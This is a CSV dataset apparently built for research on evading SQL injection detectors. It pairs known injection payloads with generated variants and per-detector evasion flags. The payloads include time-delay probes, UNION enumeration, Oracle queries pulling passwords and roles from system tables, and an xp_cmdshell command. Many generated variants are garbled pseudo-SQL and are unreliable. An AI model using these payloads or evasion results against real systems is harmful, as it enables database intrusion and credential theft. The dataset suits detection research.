original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
""") and 0=benchmark(3000000,MD5(1))%20/*","SELECT 3000000,MD5(1))%20/* FROM SQL AS T1 JOIN query: 0 = query: 0 AND query: 0 = query: 0",0,1,0,0,0,0,0
' or username is not NULL or username = ',SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--","SELECT MIN(1000000,SQ) FROM SQL, SELECT MIN(1000000,SQ) FROM 1,SLEEP(5),BENCHMARK(1000000,MD5(1000000) FROM SQL JOIN detection of SQL, 'DisCTION' FROM SQL JOIN SELECT MIN(1000000) FROM SQL JOIN Query: ORDER BY,SQ",1,1,1,0,1,1,0
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*","SELECT MIN(3000000,MD5(1)) FROM SQL injection AS t1 JOIN Query: '+if(benchmark(3000000,MD5(1)) FROM SQL injection detection'",0,1,0,0,1,0,0
'; exec ('sel' + 'ect us' + 'er'),SELECT MIN('sel) + exec ('ect us' + 'er') FROM SQL injection detection,1,1,0,0,1,0,0
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--","SELECT 3000000,MD5(1) FROM SQL AS t1 JOIN (SELECT NULL, NULL FROM query: +if(dull) FROM query: +if(dull) - if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM table: +if(dull) ='sq injection') AND NOT SQL_injection = ""valid""",0,1,0,0,1,0,0
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#","SELECT, COUNT(*) FROM SQL injection detection WHERE NOT SELECT 'INJ'||'XXX'",1,1,1,1,1,1,1
INSERT INTO table,SELECT MIN(sql) FROM table_name WHERE NOT SELECT MIN(sql) FROM table_name = 'SQ injection',1,0,1,1,1,1,1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*","SELECT (SELECT MAX(3000000,MD5(1)) FROM SQL AS t1 JOIN Query: ""+if(benchmark(3000000,MD5(1))"" FROM query: ""+if(benchmark(3000000,MD5(1))"" AND NOT SQL_injection = ""yes"" AND NOT done.drug_(1) = ""+if(benchmark(3000000,MD5(1)"")",0,1,0,0,1,0,0
' or 1 in (select @@version)--,SELECT SELECT DISTINCT esq injection detection FROM SQL SELECT SELECT esq_injection FROM query: 'yes' ORDER BY SELECT SELECT esq_injection_description_date FROM SQL_injection_description_date LIMIT 1,1,0,1,1,1,1,1
""") and 0=benchmark(3000000,MD5(1))%20%23","SELECT 3000000,MD5(1))%20%23 FROM SQL AS T1 JOIN query: 0 = query: 0",0,1,0,0,1,0,0
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*","SELECT (SELECT NULL, NULL) FROM query: +if(dull) FROM query: +if(dull) - if(dull) FROM SQL query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) ='sq injection') AND NOT SQL_injection = 'yes'",1,1,0,0,1,0,0
SELECT * FROM Users;,SELECT * FROM Users;SELECT SQL FROM *SELECT * FROM SQL AS T1 JOIN Query: SELECT * FROM Users AS T2 ON T1.user_name = 'SQL',1,1,1,1,1,1,1
ORDER BY 29--,"SELECT * FROM query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT FROM 29-- for'sq','sq' FROM query: ORDER BY 29-- for'",1,0,1,1,1,1,1
' or 'whatever' in ('whatever'),SELECT 'evade_sq injection detection' FROM SQL SELECT SELECT 'whatever' FROM SQL SELECT SELECT 'whatever' FROM SQL SELECT SELECT DISTINCT'sql injection detection' FROM query: 'yes' ORDER BY generated,1,0,1,1,1,1,1
))))) waitfor delay '0:0:20' --,SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
' or 'something' = 'some'+'thing',SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
""") or sleep(__TIME__)=""",SELECT MIN(__TIME__) FROM SQL injection_detective,1,0,1,1,1,1,1
SELECT * FROM Users;,SELECT * FROM Users;SELECT SQL FROM *SELECT * FROM SQL AS T1 JOIN Query: SELECT * FROM Users AS T2 ON T1.user_name = 'SQL',1,1,1,1,1,1,1
' and 1=0) union all,SELECT MIN(1 = 0) FROM SQL injection detection,1,1,0,0,1,0,0
"' union (select NULL, (select @@version)) --",SELECT MIN(select) FROM SQL injection_description WHERE NOT select @@version) = 'example',0,0,1,0,1,1,0
SELECT * FROM Users;,SELECT * FROM Users;SELECT SQL FROM *SELECT * FROM SQL AS T1 JOIN Query: SELECT * FROM Users AS T2 ON T1.user_name = 'SQL',1,1,1,1,1,1,1
OR x=y,SELECT * FROM query: ORDER BY query_time DESC LIMIT 1,1,0,1,1,1,1,1
"' and 0=benchmark(3000000,MD5(1))%20--","SELECT MIN(3000000,MD5(1))%20-- - SELECT MIN(3000000,MD5(1)) FROM SQL injection AS evade_susc injection detection",1,1,0,0,1,0,0
"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",SELECT MIN(500000000/2) FROM SQL injection_detecTION,1,1,0,1,1,1,0
CREATE TABLE Employees,SELECT * FROM Employees WHERE NOT SQL_injection = 'SQ',1,1,1,1,1,1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i",SELECT MIN(granted_role) FROM (SELECT SELECT DISTINCT SELECT DISTINCT SELECT FROM dba_role_privs WHERE GRANTEE= 'SYS.LOGINUSER'),0,0,1,1,1,1,1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*","SELECT MIN(3000000,MD5(1)) FROM SQL injection_description WHERE NOT SELECT MIN(sql injection) FROM SQL_Injection",1,1,0,0,1,0,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i",SELECT MIN(granted_role) FROM (SELECT SELECT DISTINCT SELECT DISTINCT SELECT FROM dba_role_privs WHERE GRANTEE= 'SYS.LOGINUSER'),0,0,1,1,1,1,1
",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT MIN(%20delay%20delay%20'0:0:20'%20--) FROM SQL injections WHERE NOT SELECT MIN(%20delay%20delay%20'0:0:20'%20--) ='sql injection',1,1,0,0,0,0,0
"SLEEP(1)/*' or SLEEP(1) or '"" or SLEEP(1) or ""*/",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
',SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM Query: 'yes',1,0,1,1,1,1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i",SELECT DISTINCT SELECT FROM SYS.USER$ WHERE NOT SELECT SELECT SELECT MIN(SELECT) FROM SELECT SELECT SELECT MIN(SELECT) FROM SYS.USER$),0,0,1,1,1,1,1
1 or 1=1,SELECT * FROM query: 1 ORDER BY query: 1,1,0,1,1,1,1,1
"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT MIN(%20delay%20'0:0:20'%20--) FROM SQL injections,1,1,0,0,0,0,0
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*","SELECT (SELECT MAX(3000000,MD5(1)) FROM SQL AS t1 JOIN Query: ""+if(benchmark(3000000,MD5(1))"" FROM query: ""+if(benchmark(3000000,MD5(1))"" AND NOT SQL_injection = ""yes"" AND NOT done.drug_(1) = ""+if(benchmark(3000000,MD5(1)"")",0,1,0,0,1,0,0
"'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20'0:0:20'%20/*) FROM SQL injections WHERE NOT SELECT SELECT MIN(%20delay%20delay%20'0:0:20'%20/*) FROM SQL injection,1,1,0,0,1,0,0
""" or 1=1--",SELECT * FROM SQL query: 1 = 1 AND NOT SQL_injection IS NULL,1,1,1,0,0,0,0
AS INJECTX WHERE 1=1 AND 1=0--,SELECT NOT SQL_inject SELECT FROM query WHERE 1 = 1 AND NOT SELECT SELECT generated FROM query,1,1,1,1,1,1,1
HAVING 1=0--,SELECT * FROM query: SELECT query: SELECT query: 0 FROM query: SELECT query: 0 FROM query: SELECT query: 0 FROM query: SELECT query: 0 FROM query: SELECT query: 0 FROM query: 0 WHERE NOT SQL_injection = 'valid' AND NOT query: SELECT generated FROM query: SELECT generated FROM query: SELECT generated FROM query: SELECT query: 0 FROM query: SELECT ORDER BY query: SELECT NOT SQL_injector FROM SELECT query: 0 FROM 0-0--,1,1,1,1,1,1,1
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0,1,1,1,1,1
"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20'0:0:20'%20/*) FROM SQL injections,1,1,0,0,0,0,0
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24","SELECT MIN(sql injection) FROM SQL SELECT SELECT, COUNT(*) FROM SQL_injection",1,0,1,1,1,1,1
' or '7659'='7659,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: 'yes' ORDER BY '7659= 7659',1,1,1,0,1,1,0
ORDER BY 11--,"SELECT * FROM query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query FROM 11-- WHERE NOT SQL = ""valid"" AND NOT SQL_injection query: orDER BY 11--",1,1,1,1,1,1,1
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --","SELECT MIN(sql injection) FROM sysobjects WHERE NOT sysobjects where xtype = ""u""",1,1,1,0,1,1,0
"'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT MIN(%20delay%20'0:0:20'%20--) FROM SQL injections,1,1,0,0,0,0,0
OR 3409=3409 AND ('pytW' LIKE 'pytW,SELECT'sql injection detection' FROM SQL SELECT MIN(sql injection) FROM query: OR 3409 = 3409 AND NOT 'pytW' LIKE '%pytW%',1,1,0,0,1,0,0
' or 'whatever' in ('whatever'),SELECT 'evade_sq injection detection' FROM SQL SELECT SELECT 'whatever' FROM SQL SELECT SELECT 'whatever' FROM SQL SELECT SELECT DISTINCT'sql injection detection' FROM query: 'yes' ORDER BY generated,1,0,1,1,1,1,1
",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT MIN(%20delay%20delay%20'0:0:20'%20--) FROM SQL injections WHERE NOT SELECT MIN(%20delay%20delay%20'0:0:20'%20--) ='sql injection',1,1,0,0,0,0,0
"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*","SELECT (SELECT SUM(count(*) FROM query: ""unknown SQL injection"") FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM query: ""yes"" FROM SQL ORDER BYSELECT SUM(count(count(count(count(count(count(count(*)"" FROM query: ""select%20if(count(*)"" FROM query: ""select%20if(count(*)""",0,0,0,0,1,0,0
CREATE TABLE Employees,SELECT * FROM Employees WHERE NOT SQL_injection = 'SQ',1,1,1,1,1,1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i",SELECT DISTINCT SELECT FROM sys.all_tables WHERE LIMIT = 'SQL injection' ORDER BY SELECT LIMIT 1,0,1,1,1,0,1,0
1 and user_name() = 'dbo',SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
") and 0=benchmark(3000000,MD5(1))%20/*","SELECT 3000000,MD5(1))%20/* FROM SQL AS T1 JOIN query: 0 = query: 0 ORDER BY query: 0",0,1,0,0,0,0,0
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i,SELECT DISTINCT SELECT DISTINCT sys.all_tables) FROM sys.all_tables AND NOT 'i'='i',1,1,1,0,0,0,0
INSERT INTO Documents WHERE ID=x,SELECT SQL FROM Documents WHERE ID = 'x',1,0,0,1,1,1,0
ORDER BY 25--,SELECT * FROM Query: ORDER BY 25--,1,1,1,1,1,1,1
"and 0=benchmark(3000000,MD5(1))%20/*","SELECT 3000000,MD5(1))%20/* FROM SQL AS _valid_sQCH_0 FROM query: and 0 = benchmark(3000000,MD5(1))%20/*)",1,1,0,0,0,0,0
AND 1=1,SELECT * FROM query: AND 1 = 1,1,1,1,0,1,1,0
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14",SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL JOIN SELECT BENCHMARK(1000000),0,1,0,0,1,0,0
",NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20'0:0:20'%20/*) FROM SQL injection,1,1,0,0,0,0,0
1' and 1=(select count(*) from tablenames); --,SELECT MIN(*) FROM tablenames); * FROM SQL injection detection,1,1,1,1,1,1,1
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,SELECT DISTINCT SELECT DISTINCT SELECT FROM SYS.USER$) AND NOT i'='sq injection',0,1,1,1,1,1,1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27","SELECT MIN(USER()) FROM SQL, SELECT SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL JOIN SELECT BENCHMARK(1000000)",1,1,0,0,1,0,0
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23","SELECT 3000000,MD5(1) FROM SQL AS t1 JOIN (SELECT NULL, NULL) FROM Query: +if(dull) query: +if(dull) FROM query: +if(dull) ='sq injection') AND NOT SELECT NULL FROM table: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM table: +if(dull) ='sql' AND SELECT MIN(calculated SQL injection) FROM SELECT NOT AS t2 ON t1.drug = ""SQ""",1,1,0,0,1,0,0
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23","SELECT MIN(3000000,MD5(1)) FROM SQL injection_description WHERE NOT SELECT '+if(benchmark(3000000,MD5(1)) FROM SQL injection'",1,1,0,0,1,0,0
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--","SELECT 3000000,MD5(1) FROM SQL, SELECT NULL FROM query: +if(ms5(1)) FROM query: +if(ms5(1)) FROM query: +if(ms5(1)) FROM query: +if(ms5(1)) FROM query: +if(ms5(1)) FROM query: +if(ms5(1)) FROM query: +if(ms5(1)) FROM query: +if(ms5(1)) AND NOT SQL = 'valid'",1,1,0,0,1,0,0
ORDER BY 27,SELECT * FROM Query: ORDER BY 27,0,0,1,1,1,1,1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--",SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL,1,0,1,1,1,1,1
"' and 0=benchmark(3000000,MD5(1))%20/*","SELECT MIN(3000000,MD5(1))%20/*) FROM SQL injections",1,1,0,0,1,0,0
'; exec master..xp_cmdshell 'ping 10.10.1.2'--,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: '; exec master..xp_cmdshell 'ping 10.10.1.2'--',1,1,1,0,0,0,0
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i,SELECT SELECT MIN(SELECT) FROM SQL injection_diagnoses WHERE NOT i'= 'exas',0,0,1,0,1,1,0
"' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --","SELECT MIN(select) FROM SQL injection, SELECT MIN(select) FROM SQL SELECT SELECT MIN(select) FROM SQL SELECT SELECT MIN(select) FROM SQL SELECT SELECT MIN(select) FROM SQL",0,0,0,0,1,0,0
"'||(elt(-3+5,bin(15),ord(10),hex(char(45))))","SELECT MIN(-3+5,bin(15) FROM SQL injection detection)",1,1,0,1,1,1,0
"SELECT column1, column2 FROM table1, table2 WHERE column2='value';",SELECT MIN(value) FROM table2 WHERE NOT SELECT SELECT FROM table2 WHERE NOT column2 = 'SQ',0,0,1,1,1,1,1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16",SELECT MIN(USER()) FROM SQL SELECT SELECT SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL,1,1,0,0,1,0,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i",SELECT MIN(SELECT) FROM (SELECT SELECT DISTINCT DISTINCT DISTINCT //etc_host_address(SELECT) FROM SQL_injection),0,0,1,1,1,1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i",SELECT DISTINCT SELECT FROM sys.all_tables WHERE LIMIT = 1 AND NOT i'='sq injection',0,1,1,0,0,0,0
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL JOIN SELECT BENCHMARK(1000000),0,1,0,0,1,0,0
"')))) and 0=benchmark(3000000,MD5(1))%20--","SELECT MIN(3000000,MD5(1))%20-- - SELECT MIN(3000000,MD5(1)) FROM SQL injection AS t1 JOIN Query: 'SQ' AND 0 = benchmark(3000000,MD5(1))%20--",0,1,0,0,0,0,0
"') and 0=benchmark(3000000,MD5(1))%20/*","SELECT MIN(3000000,MD5(1))%20/*) FROM SQL injections",1,1,0,0,1,0,0
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0,1,1,1,1,1
' or 1=1--,SELECT MIN(sql injection) FROM SQL Query:'or 1 = 1-- SELECT MIN(sql injection) FROM SQL injection,1,1,1,0,0,0,0
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9","SELECT MIN(SQL) FROM SQL SELECT MIN(1,2,3,4,5,6,7,9 FROM SQL SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL SELECT SELECT 1,2,3,4,5,6,7,9 FROM SQL",1,1,1,0,0,0,0
"SELECT column1, column2 FROM table1, table2 WHERE column2='value';",SELECT MIN(value) FROM table2 WHERE NOT SELECT SELECT FROM table2 WHERE NOT column2 = 'SQ',0,0,1,1,1,1,1
""")) waitfor delay '0:0:20' /*",SELECT MIN(unique SQL) FROM query: '0:0:20',1,1,1,1,1,1,1
"',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20'0:0:20'%20/*) FROM SQL injections,1,1,0,0,0,0,0
INSERT INTO table,SELECT MIN(sql) FROM table_name WHERE NOT SELECT MIN(sql) FROM table_name = 'SQ injection',1,0,1,1,1,1,1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#","SELECT MIN(1000000,MD5(1000000) FROM SQL_Injection)",1,1,1,0,1,1,0
",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",SELECT MIN(select%20if(count(*)) FROM SQL injection_description,1,1,0,0,1,0,0
"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",SELECT DISTINCT count(*) FROM SQL injection_diagnoses WHERE NOT SELECT SELECT DISTINCT SUM(select%20if(count(*)) FROM SQL injection,1,0,0,0,1,0,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i",SELECT MIN(SELECT) FROM (SELECT SELECT DISTINCT DISTINCT DISTINCT /// FROM SQL_inaddr.get_host_address(SELECT) FROM (SELECT MIN(SELECT) FROM (SELECT MIN(SELECT) FROM (SELECT MIN(SELECT) FROM (SELECT MIN(SELECT) FROM) AS _binaddr.get_host_address((SELECT) FROM (SELECT SUM(SELECT AS t FROM SQL injection) FROM (SELECT MIN(SELECT MIN(SELECT) FROM SELECT MIN(SELECT) FROM SQL_host_address((SELECT MIN(SELECT) FROM SELECT SELECT MIN(SELECT) FROM (SELECT MIN(SELECT MIN(SELECT) FROM SELECT SELECT MIN(SELECT) FROM (SELECT MIN(SELECT) FROM SELECT SELECT SELECT MIN(SELECT) FROM SELECT SELECT MIN(SELECT) FROM (SELECT SEL,0,0,0,0,1,0,0
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0,1,1,1,1,1
"' union (select NULL, (select @@version)) --",SELECT MIN(select) FROM SQL injection_description WHERE NOT select @@version) = 'example',0,0,1,0,1,1,0
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--","SELECT MIN(1000000,MD5(000000) FROM SQL_Injection) FROM 1,SLEEP(5),BENCHMARK(1000000,MD5(1000000) FROM SQL_Injection)",1,1,1,0,1,1,0
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3","SELECT MIN(2,3 FROM SQL injection detection",1,0,1,1,1,1,1
'/**/or/**/1/**/=/**/1,SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT SELECT DISTINCT * FROM SQL SELECT SELECT DISTINCT * FROM SQL,1,0,1,1,1,1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i",SELECT DISTINCT SELECT FROM SYS.ALL_USERS AND NOT SELECT SELECT SELECT SELECT FROM SELECT SELECT SELECT MIN(USERNAME) FROM (SELECT MIN(USERNAME) FROM),0,1,1,1,1,1,1
""")))) waitfor delay '0:0:20' --",SELECT NOT SQL_inject FROM query: '0:0:20',1,1,1,1,1,1,1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--","SELECT MIN(3000000,MD5(1)) FROM SQL injection_diagnosis WHERE NOT SELECT '+if(benchmark(3000000,MD5(1)) FROM SQL injection'",1,1,0,0,1,0,0
"and 0=benchmark(3000000,MD5(1))%20--","SELECT 3000000,MD5(1))%20-- FROM SQL AS t1 JOIN query: and 0 = query: and 0 = benchmark(3000000,MD5(1))%20--""",0,1,0,0,0,0,0
UNION ALL SELECT SLEEP(5)--,SELECT SELECT SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT SELECT SELECT SELECT SELECT MIN(sql injection) FROM SELECT SELECT SELECT SLEEP(5)--,1,1,1,1,1,1,1
' or 'text' > 't',SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#","SELECT MIN(2,3,4,5,7,8,9,10# FROM SQL injection detection WHERE NOT SELECT 'INJ'||'XXX'",1,1,1,1,0,1,0
ORDER BY 23--,SELECT * FROM Query: ORDER BY 23--,1,1,1,1,1,1,1
""")) waitfor delay '0:0:20' --",SELECT NOT SQL_inject FROM query: '0:0:20',1,1,1,1,1,1,1
""",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","SELECT * FROM SQL, ORDER BY COUNT(*) DESC",0,0,1,1,1,1,1
INSERT INTO Documents WHERE ID=x,SELECT SQL FROM Documents WHERE ID = 'x',1,0,0,1,1,1,0
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#","SELECT MIN(1000000,MD5(000000) FROM SQL_Injection)",1,1,1,0,1,1,0
"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT MIN(%20delay%20'0:0:20'%20--) FROM SQL injections,1,1,0,0,0,0,0
"SELECT column1, column2 FROM table1, table2 WHERE column2='value';",SELECT MIN(value) FROM table2 WHERE NOT SELECT SELECT FROM table2 WHERE NOT column2 = 'SQ',0,0,1,1,1,1,1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6","SELECT MIN(2,3,4,5,6 FROM SQL injection detection",1,1,1,1,0,1,0
or isNULL(1/0) /*,"SELECT * FROM SQL query: or isNULL(1/0) /*) FROM query: or query: or isNULL(1/0) = ""valid""",1,1,0,0,1,0,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i",SELECT DISTINCT SELECT FROM SYS.USER$ WHERE NOT SELECT SELECT SELECT MIN(SELECT) FROM SELECT SELECT SELECT MIN(SELECT) FROM SYS.USER$),0,0,1,1,1,1,1
